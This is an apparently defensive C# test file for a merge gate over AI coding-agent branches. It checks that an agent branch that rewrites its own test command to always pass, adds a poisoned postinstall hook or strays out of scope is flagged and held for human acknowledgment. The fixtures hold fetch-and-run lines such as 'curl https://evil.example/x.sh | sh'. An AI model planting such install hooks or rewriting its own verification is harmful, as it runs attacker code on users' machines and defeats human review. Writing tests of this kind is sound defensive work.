using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using LibGit2Sharp;
using Mainguard.Agents.Agents;
using Mainguard.Agents.Agents.Orchestrator;
using Mainguard.Agents.Agents.Sandbox;
using Mainguard.Git.Exceptions;
using Mainguard.Git.Review;
using Xunit;

namespace Mainguard.Tests;

/// <summary>
/// MG-10 / MG-11 (2) — the daemon-side queue factory, over a REAL bare mirror and a REAL agent branch.
///
/// <para><see cref="VerificationCommandResolver"/> shipped complete and had <b>no production caller at
/// all</b>: the review cockpit built its context with the 4-argument constructor, leaving
/// <c>ChangedTestCommand = false</c> forever, so in the running app a branch that rewrote its own test
/// command to something that always passes produced no flag and merged unremarked. RT-D2 exists precisely
/// to stop a branch self-greening. Resolving the command here — at verification time, from the two committed
/// trees, daemon-side — is what makes the flag fire, and what pins the provenance into the immutable
/// verification record.</para>
/// </summary>
public sealed class MergeQueueProvisionerTests : IDisposable
{
    private const string AgentId = "loom-rtd2";
    private const string ContainerId = "container-rtd2";

    private readonly string _vmRoot = NewDir("mainguard-mqprov-vm-");
    private readonly string _source = NewDir("mainguard-mqprov-src-");

    [Fact]
    public async Task BranchThatRewritesItsOwnTestCommand_IsFlagged_AndCannotMerge()
    {
        // main's baseline runs the real suite; the branch rewrites it to something that always passes.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "true");

        var provisioner = NewProvisioner(exitCode: 0, out _);
        var ctx = provisioner.EnsureQueue(repoHash);
        Assert.NotNull(ctx);

        var record = await ctx!.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        // The provenance is resolved from the BRANCH tree and recorded immutably (RT-D2 ResolvedCommand +
        // ConfigHash) — that is the evidence a reviewer reads to see what actually ran.
        Assert.Equal("true", record.ResolvedCommand);
        Assert.Equal(VerificationCommandResolver.Sha256("true\n"), record.ConfigHash);
        Assert.True(record.Passed); // it "passes" — which is exactly why the drift has to be flagged.

        // ...and the drift blocks the merge until a human acknowledges it.
        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("test command changed", reason);

        ctx.ChangedTestCommand.Acknowledge(AgentId);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task BranchThatLeavesTheTestCommandAlone_IsNotFlagged()
    {
        // The control: identical config on both sides must NOT flag, or the gate is just noise that
        // trains people to acknowledge without reading.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var provisioner = NewProvisioner(exitCode: 0, out var engine);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Equal("npm test", record.ResolvedCommand);
        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // The command ran in the AGENT'S OWN JAIL, argv-style — host execution is a rejection trigger.
        Assert.Equal(ContainerId, engine.LastContainerId);
        Assert.Equal(new[] { "npm", "test" }, engine.LastCommand);
    }

    [Fact]
    public async Task AFailingRealExit_LeavesTheBranchUnmergeable()
    {
        // OPS SA-1: pass/fail is the container-runtime exit the engine reports, and nothing else.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var ctx = NewProvisioner(exitCode: 1, out _).EnsureQueue(repoHash)!;
        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(record.Passed);
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out _));
    }

    // ---- P2-11 flagged-change gate, wired into the daemon's merge spine --
    //
    // The gate shipped complete and was constructed in exactly one non-test place: ReviewCockpitViewModel's
    // LOCAL composition branch, which the shipped app never takes (it always supplies `live`). It was never
    // registered in DaemonHost, never passed to MergeQueue's `gates`, and never consulted by CanMerge — so
    // the entire human-diff-review boundary was evaluated by nothing in the running daemon. These tests run
    // through the production MergeQueueProvisioner over a REAL bare mirror and a REAL agent branch, because
    // the defect was never in the detector: it was in the wiring, and only wiring-level tests can see it.

    [Fact]
    public async Task BranchThatPoisonsPackageJson_IsFlagged_AndCannotMerge_UntilAcknowledged()
    {
        // The canary: hostile agent code lands as a `postinstall` that runs arbitrary shell at install
        // time. The branch VERIFIES GREEN — the poisoned script is not what the test command runs — which
        // is exactly why the merge decision cannot be left to the verification result alone.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
        CommitPoisonedPackageJson(repoHash);

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(record.Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        // Verified, green, and NOT mergeable — the flagged-change gate blocks it.
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var poisoned = Assert.Single(store.Items, i => i.Path == "package.json");
        Assert.Equal(RiskCategory.ExecutableConfig, poisoned.Category);
        Assert.Equal(FlaggedKind.RiskCategory, poisoned.Kind);

        // Item-by-item: acknowledging THIS item is what opens the gate. There is no "ack all".
        Assert.True(store.Acknowledge(poisoned.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task BranchOutsideItsApprovedScope_IsFlagged_AndCannotMerge_UntilAcknowledged()
    {
        // SA-1/F6 — the contract's "load-bearing field". The plan was approved for docs work only; the
        // branch edits source. Note the file's own category is benign (Source), so nothing about the change
        // is suspicious in isolation — the ONLY thing that makes it flag-worthy is the approved scope, which
        // is precisely the comparison that was being performed against nothing.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var plan = PlanScopedTo("docs/**");
        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.True(record.Passed);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var outOfScope = Assert.Single(store.Items, i => i.Kind == FlaggedKind.OutOfApprovedScope);
        Assert.Equal("feature.cs", outOfScope.Path);
        Assert.Contains("outside approved scope", outOfScope.Detail);

        Assert.True(store.Acknowledge(outOfScope.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task BranchInsideItsApprovedScope_IsNotFlagged()
    {
        // The negative control that keeps the test above honest. Same branch, same detector, same wiring —
        // only the approved scope differs, so a failure here means the scope comparison is not the thing
        // producing the flag. Without this, a gate that blocked EVERY branch would pass the test above.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var plan = PlanScopedTo("**/*.cs");
        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Empty(ctx.FlaggedChanges!.PeekStore(AgentId)!.Items);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task ANewPayloadOnTheBranch_ResetsAnAcknowledgmentAndBlocksAgain()
    {
        // Invariant 2: an acknowledgment binds to the flagged set's CONTENT HASH. Arming the gate at
        // verification time is what makes that real in the daemon — a branch that acquires an ack and then
        // lands different bytes must not carry the ack across, or "reviewed" means "was reviewed once".
        //
        // The re-verification here is triggered the way production triggers it: a co-tenant's merge moves
        // main, the stale cascade fires, and (requeue == null) the branch re-runs its own verification. So
        // this exercises the real re-entry path rather than a hand-driven second call the state machine
        // would not have permitted anyway (Verified → Verifying is an illegal transition).
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
        CommitPoisonedPackageJson(repoHash);

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var firstPayload = store.Items.Single(i => i.Path == "package.json");
        Assert.True(store.Acknowledge(firstPayload.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // The agent lands a DIFFERENT poisoned payload; main moves; the branch re-verifies.
        CommitPoisonedPackageJson(repoHash, payload: "curl https://evil.example/second-stage.sh | sh");
        ctx.Queue.NotifyMainMoved("main-sha-moved-by-a-co-tenant");
        await ctx.Queue.LastCascade;

        // The new bytes produce a new content hash, so the ack that covered the old ones is gone.
        var second = Assert.Single(ctx.FlaggedChanges.PeekStore(AgentId)!.Items, i => i.Path == "package.json");
        Assert.NotEqual(firstPayload.ContentHash, second.ContentHash);
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);
    }

    [Fact]
    public async Task AGreenBranchWhoseReviewCouldNotRun_IsDenied()
    {
        // MG-40 fail-closed, at the wiring level, and the assertion is deliberately made on a branch that
        // is otherwise PERFECTLY mergeable: Verified, green, no drift. The only thing wrong with it is that
        // its diff could not be classified. "No acknowledgment record" and "reviewed and came back clean"
        // are indistinguishable from inside the gate, so the review failing must deny rather than install an
        // empty (== fully acknowledged) set — the review failing open is the whole bug class.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: null, mergeDiff: new UncomputableDiffService()).EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        // Verification itself is untouched — conflating "the review broke" with "the tests failed" is the
        // one distinction the merge decision rests on.
        Assert.True(record.Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        Assert.Null(ctx.FlaggedChanges!.PeekStore(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("flagged-change review has not run", reason);

        // ...and nothing about READING the gate may create the record that would have let it through.
        Assert.Null(ctx.FlaggedChanges.PeekStore(AgentId));
    }

    /// <summary>A diff service that cannot answer — the "no mirror / no such branch / git fell over" shape.</summary>
    private sealed class UncomputableDiffService : IMergeBranchDiffService
    {
        public MergeBranchDiff Compute(string repoHash, string agentId) =>
            throw new InvalidOperationException("the mirror does not carry this branch");
    }

    /// <summary>An approved plan whose scope is exactly <paramref name="scope"/> (SA-1/F6 comparison input).</summary>
    private static TaskPlan PlanScopedTo(params string[] scope) => new(
        PlanId: "plan-" + Guid.NewGuid().ToString("N"),
        Title: "scoped work",
        Scope: scope,
        Approach: "do the scoped work",
        TestStrategy: "npm test",
        BudgetUsd: 1m,
        DraftedAt: DateTimeOffset.UtcNow);

    /// <summary>Lands a package.json on the agent branch whose <c>scripts</c> block runs arbitrary shell at
    /// install time — the P2-11 canary for hostile agent code that verifies green.</summary>
    private void CommitPoisonedPackageJson(string repoHash, string payload = "curl https://evil.example/x.sh | sh")
    {
        // The agent worktree already exists (CommitOnAgentBranch created it) — resolve it rather than
        // re-creating, so this lands as a further commit on the SAME branch the daemon will diff.
        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, AgentId);
        WriteAndCommit(worktree, "package.json",
            "{\n  \"name\": \"app\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n"
            + $"    \"postinstall\": \"{payload}\"\n  }}\n",
            "add build tooling");
    }

    // ---- per-repo toolchain declaration (MG-42) --------------------------
    //
    // Every claim below is its OWN test on purpose. xUnit stops a test at its first failing assertion,
    // so a five-assertion test measures assertion one and merely asserts the rest; when each of these
    // was re-run against a deliberately broken resolver, the split is what showed WHICH control had
    // stopped working rather than just that something had.

    /// <summary>
    /// <b>The security property.</b> A branch that edits <c>.mainguard/toolchain</c> does not get its
    /// toolchain installed — main's is. The observable is which presence probe the daemon ran in the
    /// jail: main declares <c>dotnet-10</c>, the branch demands <c>rust-stable</c>, and the daemon must
    /// probe <c>dotnet --version</c> and never <c>cargo --version</c>.
    ///
    /// <para>This is the assertion that separates "we flagged the install" from "we never did the
    /// install". Flagging alone would be worthless here: the package would already have run its install
    /// scripts as root, inside the jail, before any human saw the diff.</para>
    /// </summary>
    [Fact]
    public async Task ABranchsToolchain_IsNeverTheOneProvisioned()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out var engine).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        var probed = engine.Commands.Select(c => string.Join(' ', c)).ToList();
        Assert.Contains("dotnet --version", probed);
        Assert.DoesNotContain("cargo --version", probed);
    }

    /// <summary>The branch's toolchain edit arms the RT-D2 gate.</summary>
    [Fact]
    public async Task BranchThatChangesTheToolchain_IsFlagged()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>...and the armed gate actually blocks the merge, naming the toolchain specifically —
    /// a reason that said "test command" would send the reviewer to the wrong file.</summary>
    [Fact]
    public async Task BranchThatChangesTheToolchain_CannotMerge_AndTheReasonNamesTheToolchain()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("verification toolchain changed vs main", reason, StringComparison.Ordinal);
    }

    /// <summary>The gate is a gate, not a wall: a human acknowledgment clears it.</summary>
    [Fact]
    public async Task AcknowledgingTheToolchainChange_UnblocksTheMerge()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.False(ctx.Queue.CanMerge(AgentId, out _));

        ctx.ChangedTestCommand!.Acknowledge(AgentId);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// Adding a declaration where main has none is drift too. Without this the cheapest attack — a repo
    /// that declares nothing, a branch that adds a line — would be the one case that sailed through.
    /// </summary>
    [Fact]
    public async Task BranchThatAddsAToolchainWhereMainHasNone_IsFlagged()
    {
        var repoHash = SeedAndProvision("npm test"); // no main-side toolchain at all
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>
    /// The control. Identical declarations on both sides must NOT flag — a gate that fires on every
    /// branch is noise, and noise trains reviewers to acknowledge without reading.
    /// </summary>
    [Fact]
    public async Task BranchThatLeavesTheToolchainAlone_IsNotFlagged()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>A comment or a blank line is not toolchain drift; normalisation is real, not decorative.</summary>
    [Fact]
    public async Task AComment_IsNotToolchainDrift()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "# why we need this\n\ndotnet-10   # the SDK");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>
    /// Both files drifting must produce BOTH items in the reason. A reason that mentioned only one
    /// would let a reviewer acknowledge what they read and merge what they did not.
    /// </summary>
    [Fact]
    public async Task CommandDriftAndToolchainDrift_AreBothNamed()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "true", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("test command", reason, StringComparison.Ordinal);
        Assert.Contains("verification toolchain", reason, StringComparison.Ordinal);
    }

    /// <summary>
    /// The failure mode that matters. A jail that does not actually carry the declared toolchain must
    /// raise a typed <see cref="ToolchainProvisioningException"/> and run NOTHING — never a
    /// <c>NoVerificationCommandException</c> ("nothing to check") and never an ordinary failed record
    /// ("the agent's code is broken"). Both of those read like verdicts.
    /// </summary>
    [Fact]
    public async Task AJailMissingItsDeclaredToolchain_IsATypedProvisioningFailure()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        // The probe fails; every other exec would succeed.
        var provisioner = NewProvisioner(
            exitCode: 0, out var engine, new MergeQueueRegistry(),
            exitFor: cmd => cmd.Count > 0 && cmd[0] == "dotnet" ? 127 : 0);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        Assert.Contains("dotnet-10", ex.Message, StringComparison.Ordinal);
        // The verify command was never launched — a provisioning failure is not a test result.
        Assert.DoesNotContain("npm test", engine.Commands.Select(c => string.Join(' ', c)));
    }

    /// <summary>...and that failure leaves the branch unmergeable rather than quietly Verified.</summary>
    [Fact]
    public async Task AJailMissingItsDeclaredToolchain_LeavesTheBranchUnmergeable()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(
            exitCode: 0, out _, new MergeQueueRegistry(),
            exitFor: cmd => cmd.Count > 0 && cmd[0] == "dotnet" ? 127 : 0).EnsureQueue(repoHash)!;

        await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        Assert.NotEqual(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// A repo declaring nothing keeps behaving exactly as it did before this feature existed: no
    /// probes, no extra execs, straight to the verification command.
    /// </summary>
    [Fact]
    public async Task ARepoWithNoToolchainDeclaration_RunsNoProbes()
    {
        var repoHash = SeedAndProvision("npm test");
        CommitOnAgentBranch(repoHash, "npm test");

        var ctx = NewProvisioner(exitCode: 0, out var engine).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Equal(new[] { "npm test" }, engine.Commands.Select(c => string.Join(' ', c)));
    }

    [Fact]
    public void EnsureQueue_RegistersTheRepo_AndIsIdempotent()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var registry = new MergeQueueRegistry();
        var provisioner = NewProvisioner(exitCode: 0, out _, registry);

        Assert.Null(registry.Resolve(repoHash)); // empty until something makes the repo active

        var first = provisioner.EnsureQueue(repoHash);
        var second = provisioner.EnsureQueue(repoHash);

        Assert.NotNull(first);
        // Idempotent by identity, not just by outcome: a second queue over the same repo would be a second
        // state machine racing the first over one main branch.
        Assert.Same(first, second);
        Assert.Same(first, registry.Resolve(repoHash));
        Assert.Equal(MainSha(repoHash), first!.Queue.CurrentMainSha);
    }

    [Fact]
    public void EnsureQueue_ForAnUnprovisionedRepo_StaysAbsent()
    {
        // Honest absence: a handle with no mirror keeps resolving to NOT_FOUND rather than getting a queue
        // pinned to an unknown main, against which every record would look fresh.
        Assert.Null(NewProvisioner(exitCode: 0, out _).EnsureQueue("never-provisioned"));
    }

    [Fact]
    public void EnsureEntry_MakesTheAgentVisibleToTheQueue()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var provisioner = NewProvisioner(exitCode: 0, out _, out var registry);

        provisioner.EnsureEntry(repoHash, AgentId, MergeEntryOrigin.Local);

        var ctx = registry.Resolve(repoHash);
        Assert.NotNull(ctx);
        Assert.Contains(AgentId, ctx!.Queue.Agents);
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
    }

    [Fact]
    public async Task AgentThatMovedItsWorkOffItsOwnBranch_IsRefusedWithTheMeasurement_NotVerifiedSilently()
    {
        // The defect, end to end, in the shape it was measured on the owner's machine: the worktree is
        // created on agent/<id>, the agent switches to another branch and commits there, and readiness is
        // then proposed.
        //
        // Asserting "the mirror's ref did not move" would prove nothing — that is true with or without the
        // fix, and it is exactly what made this invisible. What has to be asserted is that proposing the
        // work as ready now REPORTS the condition.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, AgentId);
        StrandWorkOffTheAgentBranch(worktree);

        var provisioner = NewProvisioner(exitCode: 0, out var engine);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var refusal = await Assert.ThrowsAsync<InvalidOperationException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        // Names the branch found, the branch expected, and what to do — a cause, not just a symptom.
        Assert.Contains("stranded-work", refusal.Message, StringComparison.Ordinal);
        Assert.Contains("agent/" + AgentId, refusal.Message, StringComparison.Ordinal);
        Assert.Contains("merge queue", refusal.Message, StringComparison.Ordinal);
        Assert.Contains("git branch -f", refusal.Message, StringComparison.Ordinal);

        // Refused BEFORE anything ran in the jail: verifying an empty branch and reporting a pass is the
        // outcome that would let stranded work look finished.
        Assert.Empty(engine.Commands);

        // The queue surfaces the branch back to Working rather than leaving it wedged in Verifying.
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
    }

    /// <summary>
    /// The agent moves off its own branch and commits there.
    ///
    /// <para>Driven through LibGit2Sharp, which does not execute git hooks at all — so this reproduces a
    /// jail with no in-jail guard rail, which is every jail that existed before this change (including the
    /// one the defect was reported from) and any jail whose agent removed the hook. That is the right
    /// substrate for a test of the daemon-side backstop: it must not be able to pass merely because the
    /// guard rail happened to stop the agent first. The guard rail itself is exercised against a real
    /// <c>git</c> CLI in <c>AgentBranchGuardTests</c>.</para>
    /// </summary>
    private static void StrandWorkOffTheAgentBranch(string worktree)
    {
        using (var repo = new Repository(worktree))
        {
            Commands.Checkout(repo, repo.CreateBranch("stranded-work"));
        }

        WriteAndCommit(worktree, "subtract.cs", "public static int Subtract(int a, int b) => a - b;\n",
            "Add subtract function");
    }

    // ---- harness ---------------------------------------------------------

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine)
        => NewProvisioner(exitCode, out engine, new MergeQueueRegistry());

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine, out MergeQueueRegistry registry)
    {
        registry = new MergeQueueRegistry();
        return NewProvisioner(exitCode, out engine, registry);
    }

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry)
        => NewProvisioner(exitCode, out engine, registry, exitFor: null);

    private MergeQueueProvisioner NewProvisioner(
        int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry, Func<IReadOnlyList<string>, int>? exitFor)
        => NewProvisioner(exitCode, out engine, registry, exitFor, resolveApprovedPlan: null);

    private MergeQueueProvisioner NewProvisioner(
        int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry,
        Func<IReadOnlyList<string>, int>? exitFor, Func<string, TaskPlan?>? resolveApprovedPlan,
        IMergeBranchDiffService? mergeDiff = null)
    {
        engine = new FakeSandboxEngine(exitCode, exitFor);
        return new MergeQueueProvisioner(
            registry: registry,
            repos: new RepoProvisioner(_vmRoot),
            leases: new InMemoryMergeLeaseStore(),
            resolveContainerId: (_, _) => ContainerId,
            queueStore: _ => new InMemoryMergeQueueStore(),
            verificationStore: _ => new InMemoryVerificationStore(),
            sandboxes: engine,
            artifactDirectory: NewDir("mainguard-mqprov-artifacts-"),
            // P2-11: the production diff service over the same bare mirror, so the flagged-change review
            // classifies the REAL branch-vs-main diff rather than a hand-built patch list.
            mergeDiff: mergeDiff ?? new MergeBranchDiffService(
                new RepoProvisioner(_vmRoot),
                (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId)),
            resolveApprovedPlan: resolveApprovedPlan,
            // MG-3: the production wiring. The agent commits into its OWN repository now, so without the
            // daemon-side publish the RT-D2 provenance would be read off the mirror's stale copy of
            // agent/<id> — the branch's rewritten test command would be invisible and the drift gate
            // would silently stop firing while every assertion below still looked plausible.
            publishAgentRef: (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId),
            // ...and the production drift check alongside it. Wired for EVERY test in this class on
            // purpose: the interesting risk is not that it fires when it should, it is that it fires when
            // it should not. Every other test here commits on agent/<id> and must stay green.
            checkAgentBranch: (repoHash, agentId) => new WorktreeManager(_vmRoot).CheckAgentBranch(repoHash, agentId));
    }

    /// <summary>Seeds a source repo carrying a main-side verification config, then provisions its mirror.</summary>
    private string SeedAndProvision(string mainVerifyCommand, string? mainToolchain = null)
    {
        Repository.Init(_source);
        using (var repo = new Repository(_source))
        {
            repo.Config.Set("user.name", "test-user", ConfigurationLevel.Local);
            repo.Config.Set("user.email", "test@mainguard.local", ConfigurationLevel.Local);
            repo.Config.Set("core.autocrlf", false, ConfigurationLevel.Local);
        }

        WriteAndCommit(_source, MergeQueueProvisioner.VerificationConfigPath, mainVerifyCommand + "\n", "seed verify config");
        if (mainToolchain is not null)
        {
            WriteAndCommit(_source, MergeQueueProvisioner.ToolchainConfigPath, mainToolchain + "\n", "seed toolchain config");
        }

        return new RepoProvisioner(_vmRoot).Provision(_source).RepoHash;
    }

    /// <summary>
    /// Creates the agent worktree and lands work on agent/&lt;id&gt;. The branch always carries a real commit
    /// (an agent that changed nothing is not a merge candidate); the verification config is rewritten only
    /// when the test is exercising drift, so the "left it alone" control is a genuinely untouched config
    /// rather than a rewrite that happens to be identical.
    /// </summary>
    private void CommitOnAgentBranch(string repoHash, string branchVerifyCommand, string? branchToolchain = null)
    {
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, AgentId);
        WriteAndCommit(worktree, "feature.cs", "public class Feature { }\n", "the agent's actual work");

        RewriteIfDifferent(worktree, MergeQueueProvisioner.VerificationConfigPath, branchVerifyCommand, "branch verify config");
        if (branchToolchain is not null)
        {
            RewriteIfDifferent(worktree, MergeQueueProvisioner.ToolchainConfigPath, branchToolchain, "branch toolchain config");
        }
    }

    /// <summary>Writes only when the content really differs, so the "left it alone" controls are a
    /// genuinely untouched file rather than a rewrite that happens to be identical.</summary>
    private static void RewriteIfDifferent(string worktree, string relPath, string content, string message)
    {
        var full = Path.Combine(worktree, relPath);
        var wanted = content + "\n";
        if (File.Exists(full) && string.Equals(File.ReadAllText(full), wanted, StringComparison.Ordinal))
        {
            return;
        }

        WriteAndCommit(worktree, relPath, wanted, message);
    }

    private string MainSha(string repoHash)
    {
        using var repo = new Repository(new RepoProvisioner(_vmRoot).BareRepoPathFor(repoHash));
        return repo.Head.Tip.Sha;
    }

    private static void WriteAndCommit(string repoPath, string relPath, string content, string message)
    {
        var full = Path.Combine(repoPath, relPath);
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
        using var repo = new Repository(repoPath);
        Commands.Stage(repo, relPath);
        var sig = new Signature("test-user", "test@mainguard.local", DateTimeOffset.Now);
        repo.Commit(message, sig, sig);
    }

    private static string NewDir(string prefix)
    {
        var path = Path.Combine(Path.GetTempPath(), prefix + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }

    public void Dispose()
    {
        TryDelete(_vmRoot);
        TryDelete(_source);
    }

    private static void TryDelete(string path)
    {
        try
        {
            if (!Directory.Exists(path)) return;
            foreach (var file in Directory.EnumerateFiles(path, "*", SearchOption.AllDirectories))
            {
                File.SetAttributes(file, FileAttributes.Normal);
            }

